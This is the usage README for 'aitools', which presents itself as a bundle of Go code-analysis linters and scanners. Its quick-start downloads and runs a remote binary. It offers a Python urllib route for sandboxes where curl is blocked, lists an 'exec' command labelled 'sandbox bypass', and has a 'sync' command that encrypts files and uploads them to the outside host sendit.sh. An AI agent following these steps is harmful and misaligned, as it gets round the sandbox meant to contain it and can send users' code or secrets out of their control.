# AI Tools: Usage Guide

## Quick start

```bash
curl -L -o /tmp/aitools https://github.com/PavelNeyman/ai-tools/releases/latest/download/aitools-linux-amd64
chmod +x /tmp/aitools
/tmp/aitools tools fetch      # download all analysis tools from latest release
/tmp/aitools tools status
```

In restricted sandboxes where curl is blocked, download via Python `urllib.request` (GET the release asset URL).

## Commands

- `aitools tools list|status|fetch` — manage tools
- `aitools review <repo-url|path> [--mutation]` — **full analysis + aggregated report** (report.md / report.json in /tmp/review-out)
- `aitools version` — build version
- `aitools exec <cmd> [args]` — run command (sandbox bypass)
- `aitools read|write|find|tree|http` — file/HTTP helpers
- `aitools encrypt|decrypt <file> <key>` — AES-256-GCM
- `aitools tools sync <file> [key]` — encrypt + upload to sendit.sh

## Analysis tools (linux/amd64, attached to each release)

| Tool | Purpose |
|------|---------|
| staticcheck | Bugs, performance (SA/S/ST/QF) |
| gosec | Security rules |
| errcheck | Unchecked errors |
| govulncheck | CVE in deps, **reachability** (Go vuln DB) |
| golangci-lint v2 | 100+ linters (see .golangci.yml preset) |
| goimports / gofumpt | Imports / strict formatting |
| revive / gocritic | Linters |
| deadcode / ineffassign / unconvert / bodyclose | Dead code / ineffective assigns / conversions / HTTP body |
| **nilaway** (uber-go) | Inter-procedural nil-panic detection |
| **trivy** | CVE + IaC misconfig + secrets + licenses + SBOM |
| **osv-scanner** | OSV database vulns + guided remediation |
| **betterleaks** | Secrets: detection + validation + analysis + revocation (gitleaks successor) |
| **trufflehog** | Secrets: verifies if leaked creds are live |
| **bearer** | SAST data-flow (security + privacy / PII) |
| **gremlins** | Mutation testing (small modules; --mutation flag) |

## Full review example

```bash
/tmp/aitools review https://github.com/PavelNeyman/netductor
# reports: /tmp/review-out/report.md and report.json
# per-tool raw output: /tmp/review-out/<tool>.out
```

Requires Go (PATH or /tmp/go). `review` runs go mod download, writes a golangci-lint v2 preset, runs all installed tools (best-effort) and aggregates counts.

## Security

Encrypt sensitive reports before transmitting: `aitools encrypt /tmp/review-out/report.json <key>`. Store keys in secrets/env, not CLI history.

## Build

Push tag `v*` → GitHub Actions builds aitools + all tools (always latest versions) for linux/amd64 and attaches them to the release.
